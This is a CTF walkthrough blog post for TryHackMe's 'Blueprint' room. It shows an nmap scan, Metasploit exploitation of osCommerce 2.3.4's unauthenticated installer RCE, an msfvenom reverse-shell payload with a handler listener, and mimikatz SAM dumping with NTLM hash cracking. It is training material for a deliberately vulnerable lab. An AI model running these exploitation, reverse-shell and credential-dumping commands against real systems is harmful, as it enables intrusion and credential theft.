---
layout: post
title: "TryHackMe: Blueprint"
date: 2025-11-25 23:00:00 +0530
categories: [TryHackMe]
tags: [tryhackme, blueprint, walkthrough, ctf, windows, oscommerce, rce, metasploit, privilege-escalation, mimikatz, hash-cracking, enumeration, pentesting, reverse-shell, smb, nmap]
render_with_liquid: false
media_subpath: /images/blueprint/
description: "A walkthrough of TryHackMe's Blueprint room, covering exploitation of a vulnerable Windows machine running osCommerce 2.3.4."
---

# TryHackMe: Blueprint CTF — Writeup | 25 November 2025

<div align="center">
    <img src="THM.png" alt="TryHackMe Logo" width="900"/>
    <img src="blueprint.png" alt="Room Banner" width="600"/>
</div>

---

## Overview
This room covers the exploitation of a vulnerable Windows machine running osCommerce 2.3.4. You'll perform reconnaissance, gain initial access via a web exploit, escalate privileges, and extract sensitive information. The walkthrough demonstrates practical techniques for web exploitation, privilege escalation, and credential harvesting.

---

## Reconnaissance & Scanning

### Nmap

Perform a full port and service scan:

```bash
nmap -Pn -T4 -n -sC -sV -p- -oN scan_nmap.txt 10.49.147.197
```

**Scan Summary:**

```
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 7.5
|_http-title: 404 - File or directory not found.
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-04-11 22:52  oscommerce-2.3.4/
| -     2019-04-11 22:52  oscommerce-2.3.4/catalog/
| -     2019-04-11 22:52  oscommerce-2.3.4/docs/
|_
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Potentially risky methods: TRACE
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-title: Index of /
445/tcp   open  microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql        MariaDB 10.3.23 or earlier (unauthorized)
8080/tcp  open  http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
|_http-title: Index of /
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-04-11 22:52  oscommerce-2.3.4/
| -     2019-04-11 22:52  oscommerce-2.3.4/catalog/
| -     2019-04-11 22:52  oscommerce-2.3.4/docs/
|_
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
Service Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: BLUEPRINT, NetBIOS user: <unknown>, NetBIOS MAC: 0a:59:52:bd:e5:fd (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: BLUEPRINT
|   NetBIOS computer name: BLUEPRINT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-11-25T17:45:12+00:00
|_clock-skew: mean: -5m53s, deviation: 1s, median: -5m54s
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-11-25T17:45:12
|_  start_date: 2025-11-25T17:39:03

```
From the Nmap scan, we identified several open ports and services running on the target machine:
- Port 80: IIS web server
- Port 443: Apache web server with SSL
- Port 8080: Another Apache web server  

---

Access the website on port 8080
<div align="center">
    <img src="8080_homepage.png" alt="8080 Homepage" width="800"/>
</div>

we see an osCommerce version 2.3.4 installation page.
---

## Exploitation

so let`s check the exploits for osCommerce 2.3.4 

<div align="center">
    <img src="osCommerce_exploit.png" alt="Exploit DB osCommerce" width="800"/>
</div>  

we get osCommerce 2.3.4 - Remote Code Execution (RCE) (Metasploit)
---

Exploit osCommerce 2.3.4 RCE using Metasploit

search for the exploit in Metasploit:

<div align="center">
    <img src="exploit_metasploit.png" alt="Metasploit Search" width="800"/>
</div>

we find the module: `exploit/multi/http/oscommerce_installer_unauth_code_exec`
---
Use the following Metasploit commands to exploit the vulnerability:

```bash
msfconsole
use exploit/multi/http/oscommerce_installer_unauth_code_exec
set RHOSTS <TARGET_IP>
set RPORT 8080
set TARGET 0
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <YOUR_IP>
set LPORT 4444
set URI /oscommerce-2.3.4/catalog/install/
exploit
```

<div align="center">
    <img src="meterpreter_shell.png" alt="Meterpreter Shell" width="800"/>
</div>

We successfully obtain a Meterpreter shell on the target machine, with user-level access.

Now we can proceed with privilege escalation to gain root/Administrator access.

For that we will use metasploit payload `windows/meterpreter/reverse_tcp`.

build the payload using msfvenom:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=1111 -f exe -o shell.exe
``` 
we get `shell.exe` file, that we will upload to the target machine using meterpreter shell.

```bash
upload shell.exe <PATH>/shell.exe
```

<div align="center">
    <img src="pload_payload.png" alt="Upload Shell" width="800"/>
</div>

Now, we need to execute the uploaded payload to get a reverse shell back to our machine.

```bash
execute -f <PATH>/shell.exe
```

now start another metasploit listener for the reverse shell:

```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <YOUR_IP>
set LPORT 1111
exploit
```

<div align="center">
    <img src="reverse_shell.png" alt="Reverse Shell" width="800"/>
</div>
We successfully get a reverse shell back to our machine with Administrator privileges.

Now we can explore the target machine and capture the flags.

Now find Lab user NTLM hash 
to find NTLM(New Technology LAN Manager) hash, we can use the mimikatz tool within the meterpreter shell.

```bash
load mimikatz
```
Mimikatz is a tool used to extract plaintext passwords, hashes, PIN codes, and Kerberos tickets from memory.

<div align="center">
    <img src="mimikatz_load.png" alt="Mimikatz Load" width="800"/>
</div>

For extracting the NTLM hash, we can use the following mimikatz command:

```bash
lsa_dump_sam
```
<div align="center">
    <img src="ntlm_hash.png" alt="NTML Hash" width="800"/>
</div>

after getting the NTML hash, we can use hashes.com to crack it and get the plaintext password.
<div align="center">
    <img src="hashes.png" alt="Hashes.com" width="800"/>
</div>


Get the root/Administrator flag located at `C:\Users\Administrator\Desktop\root.txt.txt`

```bash
cat C:\Users\Administrator\Desktop\root.txt.txt
```
<div align="center">
    <img src="root_flag.png" alt="Root Flag" width="800"/>
</div>

---

## Room Complete!

<div align="center">
    <img src="completed.png" alt="Completed" width="800"/>
</div>

## Happy Hacking!

<div align="center">
    <img src="https://media1.giphy.com/media/v1.Y2lkPTc5MGI3NjExajR2ejRlbjRuZW82Mmt0ejF0M2owNmRuNnpwb3A0cGllemdtZHJhaCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/YPhs6YoPXEJgFxERoG/giphy.gif" alt="Hacking GIF" width="800"/>
</div>
